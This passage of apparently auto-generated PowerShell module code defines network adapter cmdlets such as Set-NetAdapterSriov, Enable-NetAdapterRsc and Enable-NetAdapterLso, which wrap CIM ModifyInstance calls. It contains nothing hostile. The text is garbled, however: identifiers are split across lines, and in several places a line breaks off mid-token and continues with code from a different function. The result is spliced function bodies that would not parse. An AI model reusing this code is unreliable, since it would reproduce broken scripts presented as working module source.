[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv4')) {
      [object]$__cmdletization_value = ${IPv4}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv6')) {
      [object]$__cmdletization_value = ${IPv6}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; V
tanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NumVFs')) {
      [object]$__cmdletization_value = ${NumVFs}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NumVFs'; ParameterType = 
'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NumVFs'; ParameterType = 
'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('Enabled')) {
      [object]$__cmdletization_value = ${Enabled}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 
'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = 
$true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 
'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and 
$PassThru
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterSriov.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetAdapterSriov' -Alias '*'
  

function Enable-NetAdapterSriov
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Low', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc','InstanceID')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapterSriovSett
ingData')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${NoRestart},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 'System.Management.Automation.SwitchPa
  if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv4Enabled')) {
      [object]$__cmdletization_value = ${IPv4Enabled}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4Enabled'; 
ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; 
IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4Enabled'; 
ParameterType = 'System.Boolean'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv6Enabled')) {
      [object]$__cmdletization_value = ${IPv6Enabled}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6Enabled'; 
ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; 
IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6Enabled'; 
ParameterType = 'System.Boolean'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and 
$PassThru
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterRsc.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetAdapterRsc' -Alias '*'
  

function Enable-NetAdapterRsc
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Medium', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc','InstanceID')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapterRscSettin
gData')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv4},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv6},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${NoRestart},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
rosoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4Enabled'; ParameterType = 
'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = 
$true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4Enabled'; 
ParameterType = 'System.Boolean'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv6Enabled')) {
      [object]$__cmdletization_value = ${IPv6Enabled}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6Enabled'; 
ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; 
IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6Enabled'; 
ParameterType = 'System.Boolean'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and 
$PassThru
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterLso.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetAdapterLso' -Alias '*'
  

function Enable-NetAdapterLso
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Medium', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc','InstanceID')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapterLsoSettin
gData')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv4},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv6},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${NoRestart},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
